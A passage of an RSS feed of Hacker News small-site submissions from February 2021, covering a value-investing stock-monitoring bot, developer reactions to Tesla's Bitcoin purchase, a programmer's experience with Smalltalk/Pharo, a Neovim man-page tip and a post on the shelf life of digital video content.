<h5>This article is meant to provide valuable background information on particular investments, NOT a recommendation to buy. The investments referenced within this article may currently be traded by Henssler Financial. All material presented is compiled from sources believed to be reliable and current, but accuracy cannot be guaranteed. The contents are intended for general information purposes only. Information provided should not be the sole basis in making any decisions and is not intended to replace the advice of a qualified professional, such as a tax consultant, insurance adviser or attorney. Although this material is designed to provide accurate and authoritative information with respect to the subject matter, it may not apply in all situations. Readers are urged to consult with their adviser concerning specific situations and questions. This is not to be construed as an offer to buy or sell any financial instruments. It is not our intention to state, indicate or imply in any manner that current or past results are indicative of future profitability or expectations. As with all investments, there are associated inherent risks. Please obtain and review all financial material carefully before investing. Henssler is not licensed to offer or sell insurance products, and this overview is not to be construed as an offer to purchase any insurance products.</h5>
<p><a href="#" rel="nofollow" onclick="window.print();if(typeof(_gaq) != 'undefined') { _gaq.push(['_trackEvent','PRINTFRIENDLY', 'print', 'NULL']);
          }else if(typeof(ga) != 'undefined') {  ga('send', 'event','PRINTFRIENDLY', 'print', 'NULL'); } return false;" title="Printer Friendly, PDF &amp; Email"><img src="https://cdn.printfriendly.com/buttons/printfriendly-pdf-email-button-md.png" alt="Print Friendly, PDF &amp; Email" title="Top Indicators of a Market Bubble 3"></a></p></div></div></div>]]>
            </description>
            <link>https://www.henssler.com/top-indicators-of-a-market-bubble/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26139808</guid>
            <pubDate>Mon, 15 Feb 2021 06:38:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Developer Tools for the AtariST from HiSoft (1988)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26139741">thread link</a>) | @pjmlp
<br/>
February 14, 2021 | http://stformat.com/staf01/pages_nx1500/staf01_012.jpg | <a href="https://web.archive.org/web/*/http://stformat.com/staf01/pages_nx1500/staf01_012.jpg">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://stformat.com/staf01/pages_nx1500/staf01_012.jpg</link>
            <guid isPermaLink="false">hacker-news-small-sites-26139741</guid>
            <pubDate>Mon, 15 Feb 2021 06:26:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[StockMonitor ‚Äì my fundamental analysis bot]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26139321">thread link</a>) | @RikNieu
<br/>
February 14, 2021 | https://www.riknieu.com/stockmonitor/ | <a href="https://web.archive.org/web/*/https://www.riknieu.com/stockmonitor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>I finally wrote a piece of software that I've wanted for years - a bot that regularly monitors the stock market for good, fundamentally sound companies that are undervalued, and then lets me know as soon as it finds them.</p><h2 id="automating-value-investing">Automating value investing</h2><p>I like the idea of buying something at a bargain that would likely truly increase in value over time, not because of it being a fad or fashion, but because it is really produces a net benefit to its stakeholders. Damn, that line sounded a bit more corporate than I intended, but it's relatively succinct and I stand by it.</p><p>If we're being honest, everything else is merely speculation. Although I do dabble in stuff like crypto, I do not view it as investing. To me it's just one or two steps up from gambling. </p><p>Why? Because it does not <em>produce</em> any additional value over time, its value merely depends on what a bunch of people collectively think it's worth. A value based on... feelings? Hopes? Peer pressure? Who knows. </p><p>To me that's not truly reliable and definitely not measurable enough to base longterm decisions on. Wow, as I wrote that I could just <em>feel</em> the multitude of objections undulating across the internet and socials; "what about smart contracts!?", and mentions of "stores of value", and cries of "gold-is-just-as-bad". Quite.</p><p>And some of those criticisms might have interesting points. And yes, the same could perhaps even be said about other more traditional forms of 'investment', like residential property and precious metals. But since all of that is only tangentially related to this post, and I'm in control of what's being discussed here, let's declare it a digression, side-step the horrified, and swiftly move along.</p><p>Sure, the line between investing and speculation can be very nebulous, and I do not really want to get into that an intricate of discussion and comparison with this post, but in short, I believe it comes down to that some people like pumping money into things they <em>feel or hope</em> would be worth more in the future. They prefer hunches, gut feelings, popularity and the wisdom of the crowd to analysis of the old-school and boring. They often have slogans too, mentions of moons and diamonds and, of course, lots and lost of cheering each other on.</p><p>Others(and this is where I align myself) prefer to pump money into things they think will increase in value in due to some more concrete and measurable properties, and often puts great emphasis on the output such an entity produces. They consider that measuring and processing those properties could give one a better idea of what that thing might be realistically worth in real monetary terms, regardless of what yours or others fluctuating feelings and hunches might suggest in a moment-by-moment basis.</p><p>You see, people and their opinions are fickle. And being due to human beings being spooked, ignorant, confused or distracted, things of real value might be worth more than most people feel it is in the open market, at any particular moment in time, due to random reasons.</p><p>Everyone can suddenly get all excited about that new tech-car company, and perhaps totally forget about the boring, ancient company that might produce a lot of the chemicals used in that very same tech-car company's production lines. </p><p>The market value of companies goes up and down daily, based on what's said in the news, what's being tweeted and what some random politician might have said. But thinking about it, how can that make sense? How can a company's real value change on a whim, a whisper or mere rumour? </p><p>And that, essentially, is what the concept of value investing entails - basing investment decisions on some measurable intrinsic properties of the investment instrument, and not being swayed by the markets' irrational ups and downs. I'll also offer the <a href="https://www.investopedia.com/terms/v/valueinvesting.asp">definition of value investing from Investopedia</a>, to give you a clearer idea of what I'm angling for.</p><blockquote><a href="https://www.investopedia.com/terms/v/valueinvesting.asp">Value investing</a> is an investment strategy that involves picking <a href="https://www.investopedia.com/terms/s/stock.asp">stocks</a> that appear to be trading for less than their <a href="https://www.investopedia.com/terms/i/intrinsicvalue.asp">intrinsic</a> or book value. Value investors actively ferret out stocks they think the <a href="https://www.investopedia.com/terms/s/stockmarket.asp">stock market</a> is underestimating. They believe the market overreacts to good and bad news, resulting in stock price movements that do not correspond to a company's long-term <a href="https://www.investopedia.com/terms/f/fundamentals.asp">fundamentals</a>. The overreaction offers an opportunity to profit by buying stocks at discounted prices‚Äîon sale.</blockquote><p>Thus the aim of the bot I wanted to build was to automate the process of fundamental analysis on a particular stock market index - in my case the <a href="https://en.wikipedia.org/wiki/S%26P_500">S&amp;P500</a> - and have it notify me when it finds an opportunity where the market might be considering a stock worth less than it possibly is in reality.</p><h2 id="the-bot-spec">The bot spec</h2><p>I wanted to automate everything I previously did manually, when it came to deciding what to buy and when, except for the actual trading part. I would still like to leave that particular task manual, as I want to have the final say in if I think a stock is a good purchase or not.</p><p>That being said, the bot does the following;</p><ul><li>It updates and caches a list of stocks in the S&amp;P500 every 3 months.</li><li>It fetches and/or calculates the latest fundamental metrics for each stock, including stuff like PE, EPS, FCF, Pietroski F-Score, book value, sales and earnings every 3 months, and caches it in between.</li><li>It ranks them from most profitable, productive and stable to least, then drops the bottom ones leaving only the top 8</li><li>It calculates an estimate per share value for each company with a customised form of the <a href="https://www.investopedia.com/terms/g/graham-number.asp">Benjamin Graham formula</a></li><li>It then compares the latest price of that top 8 with their calculated estimated value twice a day, and sends me an email report of this process on every other check(thus once a day)</li><li>It notifies me via SMS and email when it finds a stock that's going at a rate a little below the estimate, so that I can have a look and decide if it's a good buy or not myself.</li></ul><h2 id="choosing-a-stack">Choosing a stack</h2><p>I chose to use NodeJS, as that's the stack I use most frequently at my day job. This helps me move comfortably fast, as I'm fluent enough in it to be able to put most of my mental effort going towards architecting the app itself, and not towards trying to figure out a new language or framework.</p><p>I could also reuse a lot of code from previous side-projects, in order to get it built much faster. Some of the code I recycled included comms functions like sending email and SMS, error loggers and Dockerfile setups.</p><p>I also opted to not use TypeScript, as I found the basic application easy enough to build and reason about without having to worry about types too much, and because it's merely a personal project that doesn't need to be sanity-checked for other team members' sake.</p><p>Although I worked on it on my free time on-and-off, sometimes in the early mornings and sometimes on weekends, I estimate it took me about 6-8 hours to get it done and in its current relatively satisfactory state.</p><h2 id="fundamental-analyst-bot-in-action-">Fundamental analyst bot in action!</h2><p>The bot currently doesn't have a dashboard or web UI, but I can offer you a screenshot from the console.</p><figure><img src="https://www.riknieu.com/content/images/2021/02/StockMonitor-2.png"><figcaption>StockMonitor in action</figcaption></figure><h2 id="conclusions-and-disclaimers">Conclusions and disclaimers</h2><p>Now, I'm not a professional trader, financial advisor or a particularly astute financially literate person, so I'm not sure of how much worth this thing really is. But this was a fun project to work on and helps me keep a regular albeit automated eye on the market to help find opportunities as defined by my own personal investment preferences and inclinations. </p><p>I'm sure some of you would disagree with the validity of the metrics I'm tracking or some of the things I might have said in the post, but for me, this bot is pretty nifty. </p><p>I'd certainly not use it to advise others on what to buy or not, but for me and my own funds it's perfect, because it automates what I did manually anyway, just way more often and regular, thereby freeing up some of my time and mental energy for other endeavours. </p><p>It hasn't identified anything for me to buy as of yet, so I obviously can't vouch for its practical usefulness at this point, but it's only been running a couple of days and the market is rather bullish in general at the moment. But I'm patient, I'll wait. I know my bot's got my back.</p><p>I'll post an update again once it's made its first recommendations, and hopefully again after that, with some concrete results.</p><p>Thanks for reading. If you have any comments or suggestions, follow and contact me on Twitter <a href="https://twitter.com/riknieu">@RikNieu</a></p><p>If you want to read more of my rants, sign up below and I'll mail you when I post new stuff. üëá</p><!--kg-card-begin: html--><!-- Begin Mailchimp Signup Form -->
</section></div>]]>
            </description>
            <link>https://www.riknieu.com/stockmonitor/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26139321</guid>
            <pubDate>Mon, 15 Feb 2021 05:09:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The biggest haters on Elon Musk's Tesla Bitcoin buy are his fellow techies]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26139253">thread link</a>) | @gge
<br/>
February 14, 2021 | https://www.businessofbusiness.com/articles/Tesla-bitcoin-elon-musk-ethereum-backlash-hacker-news/ | <a href="https://web.archive.org/web/*/https://www.businessofbusiness.com/articles/Tesla-bitcoin-elon-musk-ethereum-backlash-hacker-news/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-section">
    <!-- .sidebar -->

    <section>
      
      

      <p>The news that Tesla had invested $1.5 billion of its corporate cash in Bitcoin had all the components of a perfect storm for tech enthusiasts: Elon Musk tweets, magic internet money, and a graph pointing up and to the right. Just like his Twitter follower count, after the announcement:</p>

<p>Crypto advocates were euphoric. Tesla‚Äôs move would be the tipping point for Bitcoin, and crypto in general, to hit the mainstream, <a href="https://twitter.com/APompliano/status/1358764055285145605?s=20" target="_blank">Bitcoin boosters crowed</a>. Indeed, crypto‚Äôs usual antagonist, Wall Street, <a href="https://www.reuters.com/article/us-crypto-currency-tesla-quotes/tesla-announces-1-5-billion-bitcoin-bet-makes-payments-pledge-idUSKBN2A81PD" target="_blank">cheered along</a> this time. And if App Store ratings for Coinbase are any guide, enthusiasm for crypto investing among the retail crowd is at an all time high:</p>

<p>But the news provoked a backlash from an unexpected demographic: software developers. Check out <a href="https://news.ycombinator.com/item?id=26063920" target="_blank">this thread</a> at developer watering-hole Hacker News, for instance. It generated 1,271 comments. Here are some highlights:</p>

<blockquote>
<p>‚ÄúBitcoin is a mystery to me. Somehow it's hailed as revolutionising the economy, by replacing currency with a worse kind of currency.‚Äù ‚Äî rzodkiew</p>

<p>‚ÄúHow is there a network effect if people aren't using Bitcoin to make or receive payments? Bitcoin is no more useful to me if my friend uses it versus a stranger. "Meme effect" is more like it -- the more hype there is, the better it is for anyone holding coins. The value comes from convincing enough new people to keep buying in. It's like a ponzi scheme in that respect.‚Äù ‚Äî&nbsp;eli</p>

<p>‚ÄúThere's a lot of very very smart people who are totally lost among the trees on the technicalities of Bitcoin who don't get this one simple aspect. It's never happening.‚Äù ‚Äî&nbsp;vp8989</p>
</blockquote>

<p>The backlash has not gone unnoticed in crypto-land. Here‚Äôs what one Ethereum core developer ‚Äî&nbsp;the folks who make the whole protocol work ‚Äî&nbsp; experienced on Twitter when the Tesla news broke:</p>
<div>
<blockquote>
<div dir="ltr" lang="en"><p>My timeline is interesting:</p><p>Post 1: Tesla, Bitcoin, Mooon, Mars<br>Post 2: Musk brought shame to Tesla<br>Post 3: Crypto is going mainstream<br>Post 4: You life is not about making money</p><p>Loop.</p></div>
‚Äî P√©ter Szil√°gyi (@peter_szilagyi) <a href="https://twitter.com/peter_szilagyi/status/1358885818761379843?ref_src=twsrc%5Etfw">February 8, 2021</a></blockquote>
</div>

<p>What lies behind this apparent antipathy to crypto in what we might call ‚Äútraditional‚Äù tech? I turned to a longtime developer who straddles the crypto world and more conventional tech circles named Lauren Garcia. The Bay Area native is developing an <a href="https://microsponsors.io/" target="_blank">advertising system</a> that swaps intrusive tech for blockchain tokens. She has also worked at places like Yahoo and DuckDuckGo over the years.&nbsp;</p>

<p>Garcia says crypto is ‚Äúthe most polarizing subject‚Äù among her fellow developers. In one incident, a longtime collaborator expressed shock when he was told she was working on a crypto project. ‚ÄúI thought you were a good person,‚Äù was his sign off.&nbsp;</p>

<p>Garcia attributes the tension to a clash of values: between well-off tradtechers who associate decentralization with open-source projects, who inevitably turn to Big Tech for patronage; and crypto millennials who believe they can tokenize their way to a decentralized internet.&nbsp;</p>

<p>‚ÄúOpen-source folks have complained that there‚Äôs no way to monetize their work, and it‚Äôs true - I‚Äôve spent hundreds of hours developing open-source work that gets no compensation,‚Äù she says. ‚ÄúIt‚Äôs always been this unsolved problem, and the default is these open-source contributors get paid handsomely by a startup or enterprise company that can afford to support that project. It‚Äôs a patronage model, and the patronage comes from Big Tech.‚Äù</p>

<p>By contrast crypto is a grassroots movement with a hodgepodge of projects that get generated by enthusiastic young developers. Crypto projects have the advantage of being able to raise capital seemingly out of thin air, through mechanisms like initial coin offerings.&nbsp;</p>

<p>‚ÄúThe projects that get funded are what people are interested in,‚Äù Garcia says.&nbsp;</p>

<p>Garcia might have a point. The researcher <a href="https://nadiaeghbal.com/" target="_blank">Nadia Eghbal</a> observed in her book ‚ÄòWorking in Public: The Making and Maintenance of Open Source Software‚Äô that open-source developers generally complain about funding, but that the money problems were just a symptom of something deeper at work. Eghbal diagnoses the underlying issue as a disconnect between open-source developers‚Äô utopic conception of their work and the reality they inhabited.&nbsp;</p>

<p>You see, open-source software was supposed to be a huge collaborative effort where developers would contribute code voluntarily to a commons, gifting their creations to humanity. But Eghbal discovered that open-source projects were becoming increasingly centralized, relying on a handful of developers instead of a broad cohort, even as the projects themselves gained massive adoption.&nbsp;</p>

<p>Eghbal calls this model of open-source development ‚Äúthe stadium,‚Äù where a coterie of software developers are encircled by occasional contributors. The devs are in turn encircled by ever expanding rings of software users, who simply consume the software. Stadium models, Eghbal writes, operate on access to the key developers‚Äô attention.</p>

<p>‚ÄúMuch like a lake that requires paid licenses from fisheries to reduce overfishing, an open source project can require companies to pay to ‚Äúappropriate‚Äù attention from the project‚Äôs developers,‚Äù Eghbal writes.&nbsp;</p>

<p>The roots of the angst on Hacker News and elsewhere in the developer world might simply come from the fact that crypto people figured out a way to get themselves paid. Traditional devs might not like the fact that this solution requires spinning up ‚Äî sometimes legally questionable ‚Äî&nbsp;tokens and trading them, but the crypto market is worth well over $1 trillion dollars by now, according to <a href="https://www.tradingview.com/markets/cryptocurrencies/global-charts/" target="_blank">TradingView data</a>. The coin slingers might be on to something.&nbsp;</p>

<p>While it‚Äôs difficult to pinpoint the cultural divide between tradtech and crypto devs precisely, it‚Äôs clear that cryptocurrencies have proved to be a divisive and polarizing topic in just about every sphere it touches, from finance to politics and even to that supposedly most neutral of realms ‚Äî&nbsp;technology.&nbsp;</p>


      

      
      <h3>About the Data:</h3>
      <p>
        Thinknum tracks companies using the information they post online, jobs, social and web traffic, product sales, and app ratings, and creates data sets that measure factors like hiring, revenue, and foot traffic. Data sets may not be fully comprehensive (they only account for what is available on the web), but they can be used to gauge performance factors like staffing and sales.
      </p>
      

      



    </section><!-- .article-body -->

    
  </div></div>]]>
            </description>
            <link>https://www.businessofbusiness.com/articles/Tesla-bitcoin-elon-musk-ethereum-backlash-hacker-news/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26139253</guid>
            <pubDate>Mon, 15 Feb 2021 04:57:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Experiencing Smalltalk]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26139132">thread link</a>) | @nsm
<br/>
February 14, 2021 | https://nikhilism.com/post/2021/experiencing-smalltalk/ | <a href="https://web.archive.org/web/*/https://nikhilism.com/post/2021/experiencing-smalltalk/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			

<p>In late August 2020 I read <a href="https://press.stripe.com/#the-dream-machine">The Dream
Machine</a> and it is my favorite
book of 2020. It is an incredible overview of a sliver of computer pioneers in
the 1960s-1980s and how one man was instrumental in tying all their narratives
together. One of the strands the book follows is the group at
<a href="https://en.wikipedia.org/wiki/PARC_(company)">PARC</a> (and other places) that
firmly believed in the notion of interactive computing. Over the last year,
I‚Äôve repeatedly been introduced to this strand of thinking. There is Douglas
Engelbart‚Äôs <a href="https://www.dougengelbart.org/pubs/papers/scanned/Doug_Engelbart-AugmentingHumanIntellect.pdf">Augmenting Human
Intellect</a><sup id="fnref:2"><a href="#fn:2">1</a></sup>
and his <a href="https://en.wikipedia.org/wiki/The_Mother_of_All_Demos">mother of all
demos</a>. The notion that
computers should allow humans to <em>think better</em>, and one way to do that is to
allow humans to express and try out ideas better. <em>Writing</em> is a useful skill
to form coherent, but generally linear streams of thought. <em>Computing</em> is the
closest we can yet get to a non-linear exploration of a problem domain, and
freed from the limitations of time and space, we can recreate our thoughts in a
malleable, explorable way. By applying <a href="https://doriantaylor.com/softwares-ailing-mythology">a known process to known information,
but turning a few billion cranks at a
time</a> we can get to better
solutions, faster. The notion is, if we could have a <em>computer</em> (the physical
device including the software) that would allow people to iteratively express
their problems, get immediate sensory (primarily visual, but nothing prevents
using the other senses) feedback and <em>extend the computer as necessary</em>, we can
really liberate the human mind from some of its limitations. It is a very
different vision from the consensus reality of vendors that deliver
pre-packaged applications that all come with restrictions.</p>

<p>Smalltalk<sup id="fnref:3"><a href="#fn:3">2</a></sup> is one of the outputs of this strand of thinking and has had a
<a href="https://en.wikipedia.org/wiki/Smalltalk#History">big impact on general purpose programming
languages</a><sup id="fnref:bak"><a href="#fn:bak">3</a></sup>. However the
focus on object orientation and test-driven development have robbed the world
of what I think are its most important aspects:</p>

<ol>
<li>programming as a dialogue with the computer, with meaningful feedback and <em>assistance</em>.</li>
<li>the environment being just as important to programming as the language, and empowering users to <em>modify the environment to help solve their problem</em>.</li>
<li>semantic simplicity as a necessity for easier comprehension in the face of the above points.</li>
</ol>

<p>Aditya Siram has <a href="https://www.youtube.com/watch/baxtyeFVn3w">this excellent
talk</a> giving a taste of Smalltalk.
If you had to take only one thing away from this post, it is to go and watch
that. I knew I had to try this thing out! While I worked through the <a href="https://nikhilism.com/post/2021/experiencing-smalltalk/TODO">Pharo
MOOC</a> for a few days, I quickly lost interest in their examples. <a href="https://adventofcode.com/2020">Advent
of Code 2020</a> (AoC)<sup id="fnref:1"><a href="#fn:1">4</a></sup> seemed like a much
better avenue to really try out Smalltalk. All my experiences are based on the
<a href="https://pharo.org/">Pharo</a> variant, which seems to be the leading
implementation right now.</p>

<p>While I was working my way through AoC, Mike Levins wrote <a href="https://mikelevins.github.io/posts/2020-12-18-repl-driven/">On repl-driven
programming</a>. I
think he wasn‚Äôt fully able to convey the ideas of Smalltalk, because the term
‚ÄúREPL‚Äù is too strongly associated with Python/JavaScript/Ruby REPLs at this
point. I hope I did my <a href="https://news.ycombinator.com/item?id=25642699">bit</a> of
<a href="https://news.ycombinator.com/item?id=25642717">evangelizing</a> to <a href="https://news.ycombinator.com/item?id=25642741">correct
that</a>. Alright, lets jump into
my experience.</p>



<h2 id="a-truly-integrated-development-environment-ide">A truly integrated development environment (IDE)</h2>

<p>What do I mean? Well Smalltalk really facilitates creating a program in an
exploratory style, including test-driven development. As an example, for Day 5,
I wrote the following:</p>



<p>Now, as soon as I ‚Äúaccept‚Äù this code (by pressing Ctrl+S), Smalltalk will ask
me if I would like to define this <code>AOCBoardingPassParser</code> class. It will pop up
a little window to let me do that. It will also detect I wrote a test case
(because when I created a class for the test case, I inherited from <code>TestCase</code>)
and the system browser and other elements of the interface will have these
little gray/green/red dots next to every test case, letting me run the test and
observe the results right away. Now, this is offered in modern IDEs like
IntelliJ and PyCharm, but this was available 40 years ago in Smalltalk! But
that is just the beginning.</p>

<p>I can now run this test (remember I‚Äôve only defined the <code>AOCBoardingPassParser</code>
class at this point) and it will encounter the missing method <code>toSeat:</code> on the
class (think of this like a ‚Äústatic method‚Äù in Java/Python<sup id="fnref:static"><a href="#fn:static">5</a></sup>). In a
statically typed language, you would get a compilation error or have your IDE
highlight it for you. If you were in a dynamic language, then you‚Äôd just have
an exception thrown when running the program ‚Äì <code>AttributeError</code> in Python.
Unless you explicitly ran the test in a debugger, that is all you would get and
now you‚Äôve to go back to the editor, fix this, then re-run the test.</p>

<p>Not so in Smalltalk. First this isn‚Äôt just an IDE in the sense of a
language-aware editor. The IDE is also very aware of the runtime environment.
It will break at the stack frame with the missing method, and pop up a window.
You can <em>create</em> a method right there. This window has a full fledged editor
with code completion and all the other fanciness right there. I‚Äôm not aware of
any other environment<sup id="fnref:lisp"><a href="#fn:lisp">6</a></sup> that does this. Ok so we quickly recover by
creating the method. But I don‚Äôt know exactly what to put in there yet. Don‚Äôt
worry, this is Smalltalk. We don‚Äôt need to go through this cycle of rerunning
the entire test. The state of the running program is <em>preserved</em> until the
point where you hit the error, and you just tell the IDE ‚Äúok, I‚Äôve fixed the
immediate error, let‚Äôs try again‚Äù and it will resume execution from there! You
can do this as many times as you wish, developing the code as a function of
encountering errors and test failures. This very fast iteration cycle feels
amazing! Imagine writing a much more complex program that was running for
minutes to hours but then hit an error. In most languages you would have to fix
it and start from the beginning, but in Smalltalk you would just fix it right
there and proceed.</p>

<p>I think browser developer tools are the closest we can come to having this kind
of interactivity in widespread computing environments. They don‚Äôt do that yet,
but they could. But we need to acknowledge how much work had to be put in to
those tools vs Smalltalk. In addition, the that implementation would likely
need to be in C++ instead of JavaScript, which means users wouldn‚Äôt be able to
extend and improve it as necessary. Which brings me to my next point.</p>

<h2 id="ide-extension-and-visualization">IDE extension and visualization</h2>

<p>Where most IDEs and language implementations are written in C/C++/Java,
Smalltalk prides itself on bootstrapping from a very minimal native code core.
After that nearly everything about the runtime and the IDE is written in
Smalltalk. The program and the environment are not 2 separate things, they are
one. When you execute your program, it is just another ‚Äúthread‚Äù in the same
environment that you are creating the program in. You can do bizarre things
like remapping <code>true</code> to <code>false</code> or redefining what addition means and the
entire system will reflect the change right away (to disastrous results!). The
fact that the IDE and the program share a language means that any Smalltalk
programmer can understand and extend the IDE itself. Would you like a menu with
your most commonly used commands? Sure, just use the inspector/debugger to find
out where the menus are defined and add an entry there. Boom!</p>

<p>This also offers the really powerful ability to customize the debugger for the
task at hand. <a href="http://kursjan.github.io/petitparser2/">PetitParser2</a> is
probably the best example of this. It is a parser-combinator library. As Aditya
demonstrates in his talk, when you build up a parser, the parser provides
several hooks into the Smalltalk debugger. It can show you the matches it has
built up so far(including negative matches!) and you can run various inputs
against the parser to understand behavior. So you can start with a very simple
parser and iteratively make it complicated, observing the parse tree and
getting the behavior you want.</p>

<p>Whereas a lot of AoC implementations on reddit used various regex and string
operations for parsing inputs, I‚Äôd lean to PetitParser for anything beyond
simple white-space delimited numbers. It was just so easy and straightforward.
Instead of having to find subtle bugs in string parsing, I could actually see a
domain specific debugging view as my parser encountered tokens.</p>

<p>You could similarly imagine having domain specific drawings for your project.
If I was writing a build system in Smalltalk, I would write a build graph
viewer, and instead of a <a href="https://graphviz.org/">static graphviz image</a>, it
could be very interactive. While the build was running, it could update the
graph with file modification times, or indicate whether it thinks a file needs
to be rebuilt, and then I could easily debug why a particular file wasn‚Äôt being
built.</p>

<p>The folks at <a href="https://feenk.com/">Feenk</a> are really leveraging this in their
<a href="https://gtoolkit.com/">Glamorous Toolkit</a> to fantastic effect! I highly
recommend watching <a href="https://www.youtube.com/channel/UClLZHVq_-2D2-iI4rA2O8Ug">their
videos</a>.</p>

<h2 id="minor">Minor</h2>

<p>I appreciated the built-in Array2D class for the various game-of-life
implementations as well as <a href="https://adventofcode.com/2020/day/20">Jurassic
Jigsaw</a> where it was easy to reason in
terms of rows and columns, and quickly slice those out.  Similarly, the Point
class and special ‚Äúsyntax‚Äù<sup id="fnref:point"><a href="#fn:point">7</a></sup> made Day 12 <a href="https://github.com/nikhilm/AdventOfCode2020/blob/bbc331e2af2d948e683cade9ff4f93b4e4a3f667/AdventOfCode/AOCFerry.class.st">really
easy</a>.</p>



<p>Of course everything wasn‚Äôt magical. The Smalltalk/Pharo community is very
small, so this shouldn‚Äôt be considered a rant, just my disappointments.</p>

<h2 id="documentation">Documentation</h2>

<p>This was my biggest frustration. If we accept that <a href="https://documentation.divio.com/">documentation has 4
distinct types</a>, Smalltalk does a great job
of Reference docs, because everything can easily be inspected and browsed, so
reading method documentation, while seeing its implementation is really easy.
You can also easily inspect what an object is at the point of use, and then see
what methods are available on it. However there is still plenty of scope for
improvement here, as not all non-trivial methods have docstrings. In addition,
for such a powerful IDE, the lack of documentation tooltips on hover is very
odd.</p>

<p>It really lags behind in the other categories. There is a wealth of great
content in <a href="http://books.pharo.org/">various free books</a> and the
<a href="http://mooc.pharo.org/">MOOC</a> that explains the language and getting around
the IDE. However all the books on various useful libraries are really out of
date. It isn‚Äôt fair to expect someone to ‚Ä¶</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nikhilism.com/post/2021/experiencing-smalltalk/">https://nikhilism.com/post/2021/experiencing-smalltalk/</a></em></p>]]>
            </description>
            <link>https://nikhilism.com/post/2021/experiencing-smalltalk/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26139132</guid>
            <pubDate>Mon, 15 Feb 2021 04:34:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Man pages in color, with links (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26138941">thread link</a>) | @mdip
<br/>
February 14, 2021 | https://iamnearlythere.com/man-pages-in-color-and-links/ | <a href="https://web.archive.org/web/*/https://iamnearlythere.com/man-pages-in-color-and-links/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  <header>
    
    <p>
      <time datetime="2018-03-15T00:24:00+00:00" itemprop="datePublished">
        
        Mar 15, 2018
      </time>
      </p>
  </header>

  <div itemprop="articleBody">
    <p><a href="https://neovim.io/">Neovim</a> has builtin support for colorizing man pages, making them easier to read. It also lets you follow links to other man pages, by pressing <kbd>K</kbd> while hovering any term that has a man page.</p>

<p>To set up Neovim as the default reader for when you invoke <code>man apropos</code> etc., place the following code in your ~/.bashrc or such:</p>

<div><div><pre><code>export MANPAGER="nvim -c 'set ft=man' -"
</code></pre></div></div>

<p>There are some more pointers in the short and readable section of the <a href="https://github.com/neovim/neovim/blob/5ce8158a5d462043306ee67a3261794f169bdb17/runtime/doc/filetype.txt#L509">Neovim manual on viewing man pages</a>.</p>

  </div>

  
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://iamnearlythere.com/man-pages-in-color-and-links/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26138941</guid>
            <pubDate>Mon, 15 Feb 2021 04:04:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On the shelf life of digital video]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26138849">thread link</a>) | @rememberlenny
<br/>
February 14, 2021 | https://blog.rememberlenny.com/2021/02/13/innovation-parallels-around-trucking-and-zoom/ | <a href="https://web.archive.org/web/*/https://blog.rememberlenny.com/2021/02/13/innovation-parallels-around-trucking-and-zoom/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><main id="genesis-content"><article itemscope="" itemtype="https://schema.org/CreativeWork"><div itemprop="text"><p>Reading Time: 8 minutes read</p>




<p><strong>TLDR: There‚Äôs going to be a shit ton of temporarily useful content; businesses need to have a quick way to make the worthwhile content stand out.</strong> (Thanks Joseph)</p>



<p>There are two ideas I have been thinking about over the past few months that I want to document here. The first has to do with disruption, and the second has to do with novelty vs usefulness.</p>



<p>The late Clay Christensen pointed out that major technology shifts take place when there is a massive change in price or available quantity of something. When there was a 10x reduction in price for computers, the personal computing revolution took place. When price decreases, then the potential application for said technology significantly increase.  When prices decrease and potential applications increase, then there the quantity of said technology also increases, and with it are new platforms for new tools and previously non-existent technologies.</p>



<p>I‚Äôve heard this idea too many times to count, but something I never deeply thought about was reasons why certain ideas within the new platform do or don‚Äôt succeed. The specific area of interest for me is how the new-platform creates new opportunities that previously couldn‚Äôt exist ‚Äì and therefore everything that wasn‚Äôt possible before is novel. When I use the term novel, I mean that since it is new, its significance seems highly valued relative to the past. That being said, if the new idea was to be projected out in the new reality, the novelty eventually wears off and is no longer as valuable as it once was.</p>



<p>Another way to think of it is the bundling and unbundling effect which I believe comes from a American economist who studied the cross-country trucking industry, and the standardization of freight trucks. Sadly, I don‚Äôt know the original reference. The summary point is that when getting packages safely and cheaply across the country was difficult, the creation of an 18 wheeler semi-truck (actually, I‚Äôm pretty sure the first version was not an 18 wheeler, so I‚Äôm butchering the facts) was a new innovation that solved a large problem. Once the trailer hauling semi-truck was widely accepted as the best option for hauling freight, the machine parts were modularized so that the trucking company could delegate part production and reduce costs. At the same time, the process of modularizing the trucks allowed new entrants into the trucking space, which created differentiated offerings and options for achieving cross country freight hauling. </p>



